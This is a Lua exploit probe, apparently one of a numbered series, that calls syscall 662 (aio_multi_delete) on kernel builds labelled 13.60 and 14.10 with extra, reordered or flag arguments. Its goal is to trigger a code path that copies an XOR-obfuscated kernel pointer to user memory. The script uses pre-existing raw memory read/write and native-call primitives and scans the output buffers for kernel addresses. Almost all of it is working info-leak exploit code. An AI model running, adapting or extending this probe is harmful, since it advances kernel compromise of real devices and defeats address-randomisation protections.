-- CRASH_CLASS: LOW
-- PROBE 68c: 662 conditional feature path — XOR-obfuscated kernel pointer leak
--
-- The 13.60 decompile of sys_662 (aio_multi_delete) reveals a conditional
-- feature path (lines 591-596) that copies 12 bytes per deleted ID:
--   - 8 bytes from *(slot_entry+0x18) (request metadata pointer)
--   - 4 bytes XOR-obfuscated: (*(lVar8+0x10) >> 4) ^ *(lVar8+0x10)
--
-- The XOR is reversible: given V, solve P = (P >> 4) ^ P = V iteratively.
-- If this path is active on 14.10, it leaks a kernel address.
--
-- Activation depends on "local_a8" — a flag from a 24-byte-per-ID
-- context allocation (zone 0x1a7d800). This probe tests whether
-- passing extra arguments to 662 or using different call shapes
-- activates the feature path.
--
-- Convention: 662(ids, count, states) confirmed
--   Try:      662(ids, count, states, aux_out)
--             662(ids, count, states, aux_out, aux_size)
--             662(ids, count, aux_out, states)

print("=== PROBE 68c: 662 FEATURE PATH ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS/SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero for AIO read targets
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then
    print("FAILED to open /dev/zero — abort")
    print("=== 68c DONE ===")
    return
end

local BATCH = 16
local SENTINEL = 0xBEEFBEEF

-- AIO helpers
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))           -- offset
    wq(N(reqs) + 8, uint64(16))      -- byte count
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- ===============================
-- [A] Submit + poll BATCH requests
-- ===============================
print("")
print("[A] Submit " .. BATCH .. " AIO requests individually")
local ids = {}
for i = 1, BATCH do
    local id = submit_one()
    if id ~= 0 then
        poll_one(id)
        ids[#ids + 1] = id
    end
end
print(string.format("  submitted %d, polled all (first=0x%X last=0x%X)",
    #ids, ids[1] or 0, ids[#ids] or 0))

if #ids == 0 then
    print("NO AIO IDs — abort")
    print("=== 68c DONE ===")
    return
end

-- Build shared ID + states arrays
local count = #ids
local del_ids = memory.alloc(4 * count + 0x10)
local states = memory.alloc(4 * count + 0x10)

for i = 0, count - 1 do
    wd(N(del_ids) + i * 4, ids[i + 1])
end

-- ===============================
-- [B] Normal 662 (3 args) — baseline
-- ===============================
print("")
print("[B] Normal 662(ids, count, states) — baseline")

-- Submit a fresh batch for each test
local function fresh_batch()
    local batch_ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            batch_ids[#batch_ids + 1] = id
        end
    end
    return batch_ids
end

-- Test B: normal 3-arg call
local b_ids = fresh_batch()
if #b_ids > 0 then
    local bc = #b_ids
    local b_del = memory.alloc(4 * bc + 0x10)
    local b_st = memory.alloc(4 * bc + 0x10)
    for i = 0, bc - 1 do
        wd(N(b_del) + i * 4, b_ids[i + 1])
        wd(N(b_st) + i * 4, SENTINEL)
    end
    local ok, rv = pcall(function()
        return mk(662)(uint64(N(b_del)), uint64(bc), uint64(N(b_st)))
    end)
    local ret = ok and sgn(rv) or -999
    local ok_count = 0
    for i = 0, bc - 1 do
        if rd(N(b_st) + i * 4) == 0 then ok_count = ok_count + 1 end
    end
    print(string.format("  ret=%d deleted=%d/%d", ret, ok_count, bc))
else
    print("  SKIP — no IDs")
end

if not alive() then print("DEAD after baseline"); print("=== 68c DONE ==="); return end

-- ===============================
-- [C] Feature path: 662 with 4th arg = output buffer
-- ===============================
print("")
print("[C] 662(ids, count, states, aux_out) — 4th arg feature path")

-- 13.60: aux context is 0x18 (24) bytes per ID
-- Try: 4th arg = pointer to sentinel-filled buffer
local AUX_STRIDE = 24  -- 0x18 bytes per ID from 13.60 decode

local c_ids = fresh_batch()
if #c_ids > 0 then
    local cc = #c_ids
    local c_del = memory.alloc(4 * cc + 0x10)
    local c_st = memory.alloc(4 * cc + 0x10)
    local c_aux = memory.alloc(AUX_STRIDE * cc + 0x40)

    for i = 0, cc - 1 do
        wd(N(c_del) + i * 4, c_ids[i + 1])
        wd(N(c_st) + i * 4, SENTINEL)
    end
    -- Fill aux with sentinel
    for i = 0, AUX_STRIDE * cc - 1, 4 do
        wd(N(c_aux) + i, SENTINEL)
    end

    local ok, rv = pcall(function()
        return mk(662)(uint64(N(c_del)), uint64(cc), uint64(N(c_st)), uint64(N(c_aux)))
    end)
    local ret = ok and sgn(rv) or -999
    print(string.format("  ret=%d", ret))

    -- Scan aux buffer for any modified bytes
    local modified = 0
    local kptrs = 0
    for i = 0, cc - 1 do
        local base = N(c_aux) + i * AUX_STRIDE
        local changed = false
        for j = 0, AUX_STRIDE - 4, 4 do
            local v = rd(base + j) or SENTINEL
            if v ~= SENTINEL then
                changed = true
                -- Check each qword pair for kernel pointer
                if j % 8 == 0 then
                    local hi_v = rd(base + j + 4) or SENTINEL
                    if hi_v >= 0xFFFF8000 and hi_v ~= SENTINEL and hi_v ~= 0xFFFFFFFF then
                        kptrs = kptrs + 1
                        print(string.format("  *** KPTR at id[%d]+%d: %X_%08X ***",
                            i, j, hi_v, v))
                    end
                end
            end
        end
        if changed then
            modified = modified + 1
            -- Dump the first 3 changed entries
            if modified <= 3 then
                local d = {}
                for j = 0, AUX_STRIDE - 4, 4 do
                    d[#d + 1] = string.format("%08X", rd(base + j) or 0)
                end
                print(string.format("  id[%d] aux: %s", i, table.concat(d, " ")))
            end
        end
    end
    print(string.format("  aux modified: %d/%d entries, kptrs: %d", modified, cc, kptrs))
else
    print("  SKIP — no IDs")
end

if not alive() then print("DEAD after 4-arg test"); print("=== 68c DONE ==="); return end

-- ===============================
-- [D] Feature path: 662 with 4th=aux 5th=size
-- ===============================
print("")
print("[D] 662(ids, count, states, aux_out, aux_size) — 5th arg size")

local d_ids = fresh_batch()
if #d_ids > 0 then
    local dc = #d_ids
    local d_del = memory.alloc(4 * dc + 0x10)
    local d_st = memory.alloc(4 * dc + 0x10)
    local d_aux = memory.alloc(AUX_STRIDE * dc + 0x40)

    for i = 0, dc - 1 do
        wd(N(d_del) + i * 4, d_ids[i + 1])
        wd(N(d_st) + i * 4, SENTINEL)
    end
    for i = 0, AUX_STRIDE * dc - 1, 4 do
        wd(N(d_aux) + i, SENTINEL)
    end

    local ok, rv = pcall(function()
        return mk(662)(uint64(N(d_del)), uint64(dc), uint64(N(d_st)),
            uint64(N(d_aux)), uint64(AUX_STRIDE * dc))
    end)
    local ret = ok and sgn(rv) or -999
    print(string.format("  ret=%d", ret))

    local modified = 0
    local kptrs = 0
    for i = 0, dc - 1 do
        local base = N(d_aux) + i * AUX_STRIDE
        for j = 0, AUX_STRIDE - 4, 4 do
            local v = rd(base + j) or SENTINEL
            if v ~= SENTINEL then
                modified = modified + 1
                if j % 8 == 0 then
                    local hi_v = rd(base + j + 4) or SENTINEL
                    if hi_v >= 0xFFFF8000 and hi_v ~= SENTINEL and hi_v ~= 0xFFFFFFFF then
                        kptrs = kptrs + 1
                        print(string.format("  *** KPTR at id[%d]+%d: %X_%08X ***",
                            i, j, hi_v, v))
                    end
                end
            end
        end
    end
    print(string.format("  aux dwords modified: %d, kptrs: %d", modified, kptrs))
else
    print("  SKIP — no IDs")
end

if not alive() then print("DEAD after 5-arg test"); print("=== 68c DONE ==="); return end

-- ===============================
-- [E] Feature path: swap args 3 and 4
-- ===============================
print("")
print("[E] 662(ids, count, aux_out, states) — swapped arg order")

local e_ids = fresh_batch()
if #e_ids > 0 then
    local ec = #e_ids
    local e_del = memory.alloc(4 * ec + 0x10)
    local e_st = memory.alloc(4 * ec + 0x10)
    local e_aux = memory.alloc(AUX_STRIDE * ec + 0x40)

    for i = 0, ec - 1 do
        wd(N(e_del) + i * 4, e_ids[i + 1])
        wd(N(e_st) + i * 4, SENTINEL)
    end
    for i = 0, AUX_STRIDE * ec - 1, 4 do
        wd(N(e_aux) + i, SENTINEL)
    end

    local ok, rv = pcall(function()
        return mk(662)(uint64(N(e_del)), uint64(ec), uint64(N(e_aux)), uint64(N(e_st)))
    end)
    local ret = ok and sgn(rv) or -999
    print(string.format("  ret=%d", ret))

    -- Check states (now in 4th arg position)
    local st_ok = 0
    for i = 0, ec - 1 do
        if rd(N(e_st) + i * 4) == 0 then st_ok = st_ok + 1 end
    end
    print(string.format("  states(arg4): %d/%d = 0 (deleted)", st_ok, ec))

    -- Check aux (now in 3rd arg position)
    local aux_mod = 0
    for i = 0, AUX_STRIDE * ec - 4, 4 do
        if rd(N(e_aux) + i) ~= SENTINEL then aux_mod = aux_mod + 1 end
    end
    print(string.format("  aux(arg3) dwords modified: %d", aux_mod))
else
    print("  SKIP — no IDs")
end

if not alive() then print("DEAD after swap test"); print("=== 68c DONE ==="); return end

-- ===============================
-- [F] Feature path: 662 with 6th arg = feature flag
-- ===============================
print("")
print("[F] 662(ids, count, states, aux, size, flag=1) — explicit flag")

local f_ids = fresh_batch()
if #f_ids > 0 then
    local fc = #f_ids
    local f_del = memory.alloc(4 * fc + 0x10)
    local f_st = memory.alloc(4 * fc + 0x10)
    local f_aux = memory.alloc(AUX_STRIDE * fc + 0x40)

    for i = 0, fc - 1 do
        wd(N(f_del) + i * 4, f_ids[i + 1])
        wd(N(f_st) + i * 4, SENTINEL)
    end
    for i = 0, AUX_STRIDE * fc - 1, 4 do
        wd(N(f_aux) + i, SENTINEL)
    end

    local ok, rv = pcall(function()
        return mk(662)(uint64(N(f_del)), uint64(fc), uint64(N(f_st)),
            uint64(N(f_aux)), uint64(AUX_STRIDE * fc), uint64(1))
    end)
    local ret = ok and sgn(rv) or -999
    print(string.format("  ret=%d", ret))

    local modified = 0
    for i = 0, AUX_STRIDE * fc - 4, 4 do
        if rd(N(f_aux) + i) ~= SENTINEL then modified = modified + 1 end
    end
    print(string.format("  aux dwords modified: %d", modified))
else
    print("  SKIP — no IDs")
end

if not alive() then print("DEAD after flag test"); print("=== 68c DONE ==="); return end

-- ===============================
-- [G] XOR deobfuscation helper + deep state scan
-- ===============================
print("")
print("[G] Deep state scan — check if states array has > 4 bytes per ID")

-- The normal states array is 4 bytes per ID (one dword).
-- Check if 662 writes beyond the 4-byte boundary into padding.
local g_ids = fresh_batch()
if #g_ids > 0 then
    local gc2 = #g_ids
    local g_del = memory.alloc(4 * gc2 + 0x10)
    -- Allocate states with 24 bytes per ID (instead of 4)
    local g_st_wide = memory.alloc(AUX_STRIDE * gc2 + 0x40)

    for i = 0, gc2 - 1 do
        wd(N(g_del) + i * 4, g_ids[i + 1])
    end
    -- Fill entire wide states buffer with sentinel
    for i = 0, AUX_STRIDE * gc2 - 1, 4 do
        wd(N(g_st_wide) + i, SENTINEL)
    end

    local ok, rv = pcall(function()
        return mk(662)(uint64(N(g_del)), uint64(gc2), uint64(N(g_st_wide)))
    end)
    local ret = ok and sgn(rv) or -999
    print(string.format("  ret=%d", ret))

    -- Scan: which dword positions got modified?
    local positions = {}
    for i = 0, gc2 - 1 do
        local base = N(g_st_wide) + i * AUX_STRIDE
        for j = 0, AUX_STRIDE - 4, 4 do
            local v = rd(base + j) or SENTINEL
            if v ~= SENTINEL then
                positions[j] = (positions[j] or 0) + 1
                -- Check for kernel pointers in the extra bytes
                if j >= 4 and j % 8 == 0 then
                    local hi_v = rd(base + j + 4) or SENTINEL
                    if hi_v >= 0xFFFF8000 and hi_v ~= SENTINEL and hi_v ~= 0xFFFFFFFF then
                        print(string.format("  *** KPTR in wide states id[%d]+%d: %X_%08X ***",
                            i, j, hi_v, v))
                    end
                end
            end
        end
    end

    print("  Modified positions (within 24-byte stride):")
    for pos, cnt in pairs(positions) do
        print(string.format("    offset +%d: %d/%d entries", pos, cnt, gc2))
    end

    -- Dump first entry fully
    if positions[0] then
        local d = {}
        for j = 0, AUX_STRIDE - 4, 4 do
            d[#d + 1] = string.format("%08X", rd(N(g_st_wide) + j) or SENTINEL)
        end
        print("  id[0] wide: " .. table.concat(d, " "))
    end
else
    print("  SKIP — no IDs")
end

-- ===============================
-- [H] Summary
-- ===============================
print("")
print("[H] SUMMARY")
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))
print("  If any aux buffer was modified, the feature path is ACTIVE on 14.10")
print("  If kptrs found, the XOR-obfuscated pointer leak works")
print("  If wide states show data past +0, the states stride is > 4 bytes")

print("")
print("=== 68c DONE ===")
